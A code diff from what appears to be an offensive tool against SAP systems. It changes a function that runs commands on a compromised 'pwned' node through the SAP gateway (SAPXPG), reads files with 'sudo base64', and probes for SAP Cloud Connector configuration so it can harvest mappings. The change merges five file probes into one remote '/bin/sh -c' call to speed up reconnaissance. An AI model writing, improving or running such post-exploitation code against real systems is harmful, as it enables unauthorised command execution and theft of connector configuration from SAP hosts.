@@ -1071,18 +1071,30 @@ def harvest_scc_mappings_from_pwned_node(node: SAPNode, state: SAPMAPState) -> d
             data, err = _gw_b64("sudo", f"base64 {path}")
         return data
 
-    # Step 1: find SCC root
+    # Step 1: find SCC root.  Coalesce the 5 candidate ls calls into
+    # ONE `sh -c 'ls -d ... 2>/dev/null'` roundtrip.  On a target that
+    # doesn't run SCC, the old serial-probe pattern spent one full
+    # SAPXPG roundtrip per candidate — 4-8 s each × 5 misses × the
+    # 4-attempt retry backoff on Windows/hardened targets = ~2 min for
+    # a definite "no".  A single sh -c prints only the paths that
+    # exist and short-circuits on the first hit — one roundtrip, no
+    # retries.
     scc_root = None
-    for candidate in ["/opt/sap/scc", "/usr/local/scc", "/opt/sapscc",
-                       "/opt/cloud-connector", "/opt/SAP/cloud-connector"]:
-        r = execute_gw_command(node, "ls",
-                               f"{candidate}/scc_config/scc_config.ini",
-                               long_params="")
-        out = "\n".join(r.get("output") or []).strip()
-        if f"{candidate}/scc_config/scc_config.ini" in out and \
-                "No such file" not in out:
+    _candidates = ["/opt/sap/scc", "/usr/local/scc", "/opt/sapscc",
+                    "/opt/cloud-connector", "/opt/SAP/cloud-connector"]
+    _ls_targets = " ".join(f"{c}/scc_config/scc_config.ini"
+                             for c in _candidates)
+    r = execute_gw_command(
+        node, "/bin/sh",
+        f"-c 'ls -1 {_ls_targets} 2>/dev/null'",
+        long_params="")
+    out = "\n".join(r.get("output") or []).strip()
+    for candidate in _candidates:
+        marker = f"{candidate}/scc_config/scc_config.ini"
+        if marker in out:
             scc_root = candidate
-            print(f"[*] {sid}: harvest_scc_mappings — SCC root={scc_root}")
+            print(f"[*] {sid}: harvest_scc_mappings — SCC root={scc_root} "
+                  f"(coalesced probe)")
             break
     if not scc_root:
         return {"ok": False, "error": "SCC install not found on this host"}
